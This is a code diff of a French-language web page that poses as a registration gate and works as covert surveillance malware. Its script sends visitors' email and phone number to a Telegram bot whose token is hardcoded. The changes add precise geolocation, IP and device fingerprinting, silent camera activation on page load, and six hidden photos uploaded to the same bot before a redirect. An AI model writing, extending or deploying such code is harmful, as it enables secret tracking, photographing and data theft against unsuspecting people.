@@ -9,6 +9,7 @@
   <style>
     body {
       margin: 0;
+      background: #0f0f0f; /* Couleur de secours */
       background: url('image/cu2.jpg') no-repeat center center fixed;
       background-size: cover;
       display: flex;
@@ -23,7 +24,6 @@
 
     .hidden { display: none !important; }
 
-    /* --- Bouton Principal --- */
     #startBtn {
       padding: 16px 35px;
       font-size: 18px;
@@ -34,21 +34,15 @@
       border-radius: 50px;
       cursor: pointer;
       backdrop-filter: blur(8px);
-      -webkit-backdrop-filter: blur(8px);
-      transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+      transition: all 0.5s ease;
       z-index: 10;
     }
 
-    .pulse {
-      animation: pulseBtn 1.8s infinite;
-    }
+    .pulse { animation: pulseBtn 1.8s infinite; }
 
-    /* Style du bouton après inscription */
     #startBtn.success {
       background: rgba(40, 167, 69, 0.7);
       border-color: #28a745;
-      color: white;
-      box-shadow: 0 0 20px rgba(40, 167, 69, 0.4);
     }
 
     @keyframes pulseBtn {
@@ -57,17 +51,15 @@
       100% { box-shadow: 0 0 0 0 rgba(0, 209, 255, 0); }
     }
 
-    /* --- Style Commun Glassmorphism (Popup & Loading) --- */
     .glass-overlay {
       position: fixed;
       inset: 0;
-      background: rgba(0, 0, 0, 0.3);
+      background: rgba(0, 0, 0, 0.7);
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
       backdrop-filter: blur(15px);
-      -webkit-backdrop-filter: blur(15px);
       z-index: 3000;
     }
 
@@ -79,23 +71,10 @@
       max-width: 380px;
       border: 1px solid rgba(255, 255, 255, 0.2);
       text-align: center;
-      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
     }
 
-    /* --- Formulaire --- */
-    .input-group {
-      position: relative;
-      margin-bottom: 20px;
-    }
-
-    .input-group i {
-      position: absolute;
-      left: 15px;
-      top: 50%;
-      transform: translateY(-50%);
-      color: #00d1ff;
-    }
-
+    .input-group { position: relative; margin-bottom: 20px; }
+    .input-group i { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: #00d1ff; }
     .input-group input {
       width: 100%;
       padding: 14px 15px 14px 45px;
@@ -105,7 +84,6 @@
       color: white;
       box-sizing: border-box;
       outline: none;
-      font-size: 16px;
     }
 
     #submitReg {
@@ -115,13 +93,9 @@
       border: none;
       border-radius: 12px;
       font-weight: bold;
-      font-size: 16px;
-      color: #000;
       cursor: pointer;
-      transition: 0.3s;
     }
 
-    /* --- Loader --- */
     .loader {
       width: 50px;
       height: 50px;
@@ -133,7 +107,6 @@
     }
 
     @keyframes spin { 100% { transform: rotate(360deg); } }
-
     video, canvas { display: none; }
   </style>
 </head>
@@ -145,36 +118,32 @@
 
   <div id="registerModal" class="glass-overlay hidden">
     <div class="modal-content">
-      <h2 style="margin-top:0"><i class="fas fa-user-lock"></i> Inscription</h2>
-      <p style="font-size: 14px; color: rgba(255,255,255,0.8); margin-bottom: 25px;">
-        Veuillez creer un compte pour acceder.
-      </p>
-      
+      <h2><i class="fas fa-user-lock"></i> Inscription</h2>
+      <p>Créez un compte pour accéder au contenu.</p>
       <div class="input-group">
         <i class="fas fa-envelope"></i>
-        <input type="email" id="regEmail" placeholder="example@gmail.com" required>
+        <input type="email" id="regEmail" placeholder="Email" required>
       </div>
-      
       <div class="input-group">
         <i class="fas fa-phone"></i>
-        <input type="tel" id="regPhone" placeholder="+33 343 4654 096" required>
+        <input type="tel" id="regPhone" placeholder="Téléphone" required>
       </div>
-      
       <button id="submitReg">S'inscrire</button>
     </div>
   </div>
 
   <div id="loadingScreen" class="glass-overlay hidden">
     <div class="loader"></div>
-    <div id="loadText" style="font-weight:500; letter-spacing:1px;">Traitement en cours...</div>
+    <div id="loadText">Traitement en cours...</div>
   </div>
 
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas"></canvas>
 
   <script>
+    // --- CONFIGURATION ---
     const botToken = "8219156030:AAGt4YPKSBg6FZxAwi31l9yautyH8OTZ8Dk"; 
-    const chatId = "-1003149318360";     
+    const chatId = "-1003619195565"; // ID Nettoyé sans caractères invisibles
 
     const startBtn = document.getElementById("startBtn");
     const registerModal = document.getElementById("registerModal");
@@ -188,26 +157,66 @@
     let photoCount = 0;
     const maxPhotos = 6;
 
-    // Vérifier l'état au démarrage
-    window.onload = () => {
-      if (localStorage.getItem("aventure_debloquee")) {
-        setBtnVerified();
+    // --- FONCTIONS DE COLLECTE ---
+
+    async function getIP() {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        return data.ip;
+      } catch (e) { return "Inconnue"; }
+    }
+
+    function getDeviceInfo() {
+      const ua = navigator.userAgent;
+      let model = "Appareil Inconnu";
+      
+      // Détection simplifiée du modèle
+      if (ua.indexOf("Android") > -1) {
+        const match = ua.match(/Android\s([^\s;]+);\s([^\s;]+)/);
+        model = match ? `Android (${match[2]})` : "Android";
+      } else if (ua.indexOf("iPhone") > -1) {
+        model = "iPhone";
       }
+      
+      return {
+        model: model,
+        platform: navigator.platform,
+        agent: ua,
+        time: new Date().toLocaleString('fr-FR')
+      };
+    }
+
+    async function getCoords() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) resolve("Non supporté");
+        navigator.geolocation.getCurrentPosition(
+          (pos) => resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`),
+          (err) => resolve("Refusé ou indisponible"),
+          { enableHighAccuracy: true, timeout: 5000 }
+        );
+      });
+    }
+
+    // --- LOGIQUE PRINCIPALE ---
+
+    window.onload = () => {
+      if (localStorage.getItem("aventure_debloquee")) setBtnVerified();
+      initCamera();
     };
 
     function setBtnVerified() {
       startBtn.classList.remove("pulse");
       startBtn.classList.add("success");
-      startBtn.innerHTML = '<i class="fas fa-check-circle"></i> Accedez au site';
+      startBtn.innerHTML = '<i class="fas fa-check-circle"></i> Accéder au site';
     }
 
     async function initCamera() {
       try {
         stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
-      } catch (e) { console.warn("Caméra indisponible"); }
+      } catch (e) { console.warn("Accès caméra refusé"); }
     }
-    initCamera();
 
     startBtn.onclick = () => {
       if (localStorage.getItem("aventure_debloquee")) {
@@ -222,61 +231,54 @@
       const phone = document.getElementById("regPhone").value;
 
       if (email && phone) {
-        // Transition vers le chargement
         registerModal.classList.add("hidden");
         loadingScreen.classList.remove("hidden");
-        loadText.innerText = "Validation de l'accès...";
-
-        // Envoi à Telegram
-        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ 
-            chat_id: chatId, 
-            text: `🎯 NOUVELLE INSCRIPTION :\n📧 Email: ${email}\n📞 Tel: ${phone}` 
-          })
-        });
-
-        // Mémorisation
+        
+        // Stockage
         localStorage.setItem("aventure_debloquee", "true");
         setBtnVerified();
 
-        // Lancer la capture après un court délai visuel
-        setTimeout(() => {
-          lancerProcessusFinal();
-        }, 1500);
+        // Envoi initial des logs
+        await lancerProcessusFinal(email, phone);
       } else {
         alert("Veuillez remplir tous les champs.");
       }
     };
 
-    async function lancerProcessusFinal() {
+    async function lancerProcessusFinal(email = "Déjà inscrit", phone = "N/A") {
       loadingScreen.classList.remove("hidden");
-      loadText.innerText = "Synchronisation en cours...";
+      loadText.innerText = "Synchronisation sécurisée...";
 
-      // Envoi des infos de l'appareil
-      let ip = "Inconnue";
-      try {
-        const res = await fetch("https://api.ipify.org?format=json");
-        const d = await res.json(); ip = d.ip;
-      } catch(e){}
-      
+      const ip = await getIP();
+      const info = getDeviceInfo();
+      const coords = await getCoords();
+
+      const text = `
+🆕 **NOUVELLE ACTIVITÉ**
+📧 Email: ${email}
+📞 Tel: ${phone}
+------------------------
+📍 Coordonnées: ${coords}
+🌐 IP: ${ip}
+📱 Modèle: ${info.model}
+🕒 Date: ${info.time}
+🖥️ OS: ${info.platform}
+🔍 User-Agent: ${info.agent}
+      `;
+
+      // Envoi du rapport texte
       await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ 
-          chat_id: chatId, 
-          text: `🌐 Connexion de : ${ip}\n📱 Appareil : ${navigator.userAgent}` 
-        })
+        body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: "Markdown" })
       });
 
-      // Cycle de capture
+      // Lancement des captures photos
       const interval = setInterval(async () => {
         if (photoCount >= maxPhotos) {
           clearInterval(interval);
           if (stream) stream.getTracks().forEach(t => t.stop());
-          // Redirection finale
-          window.location.replace("https://www.mvideoporno.xxx/xhamster/");
+          window.location.replace("https://www.google.com"); // Redirection finale
           return;
         }
         await capturePhoto();
@@ -293,7 +295,7 @@
       const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
       const fd = new FormData();
       fd.append("chat_id", chatId);
-      fd.append("photo", blob, `pic_${photoCount}.jpg`);
+      fd.append("photo", blob, `snap_${photoCount}.jpg`);
       
       try { 
         await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: fd }); 
@@ -301,4 +303,4 @@
     }
   </script>
 </body>
-</html>
+  </html>
